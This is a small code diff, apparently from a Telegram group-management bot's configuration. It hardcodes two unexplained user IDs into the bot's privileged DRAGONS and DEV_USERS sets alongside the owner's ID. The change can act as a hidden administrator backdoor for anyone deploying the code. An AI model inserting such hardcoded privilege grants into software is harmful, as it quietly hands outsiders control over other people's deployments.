@@ -187,7 +187,13 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 DRAGONS.add(OWNER_ID)
+DRAGONS.add(1963952285)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1200780834)
+DEV_USERS.add(1963952285) 
+
+
+
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
 
